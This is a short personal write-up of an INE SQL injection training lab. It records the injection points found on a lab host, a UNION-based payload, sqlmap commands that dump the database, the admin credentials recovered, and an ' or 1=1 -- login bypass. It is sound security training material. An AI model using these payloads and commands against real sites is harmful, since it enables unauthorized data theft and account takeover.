#SQL Injection Lab - RCM 8/15/2021
#INE 

#Description

In this lab you can practice the SQL Injection techniques and tools studied during the course. You can access the target web application at the following address 10.124.211.96.

#Goal

The goal of this lab is to test the web application in order to find all the vulnerable injection points. Once you find them, you should be able to dump all the data and successfully log into the web application.

#Tools

The best tools for this lab are:

    Web browser

    SQL map.

#Steps

1. Explore Web App at 10.124.211.96 & find all possible injection points.

Testing login page (login.php) with credentials a':a'
Result: susceptible to SQLi
Testing newsdetails.php
Result: susceptible to SQLi

2. Test and exploit injection points with different techniques.
- Testing UNION request on newsdetails.php page.
`10.124.211.96/newsdetails.php?id=' 'UNION SELECT user(); -- -;`
Return: awd@localhost
Moving to SQLMap.
`sqlmap -u http://10.124.211.96/newsdetails.php?id=29 -p id --technique=U`
Got a payload.
Input to URL: http://10.124.211.96/newsdetails.php?id=29%20UNION%20ALL%20SELECT%20CONCAT(0x7171787671,0x615066497054734c775947446c434665476f4e4351537358666673796b4a4958566a646e446b5774,0x7178767171)--%20-
Result from webpage:
tempusqqxvqaPfIpTsLwYGDlCFeGoNCQSsXffsykJIXVjdnDkWtqxvqq

3. Dump the data and log in to the web app.
`sqlmap -u http://10.124.211.96/newsdetails.php?id=29 --tables`
Database: awd
`sqlmap -u http://10.124.211.96/newsdetails.php?id=29 --tables -D awd --dump`
1  | admin@awdmgmt.labs                                  | S3cr3tBOFH  | Admin
Logged in using admin credentials, but the site is being worked on. NASTY HACKERS??

4. Login without using any credentials. (SQLi payload to bypass authentication)
This worked:
Email:
' or 1=1 --
Password:
' or 1=1 --


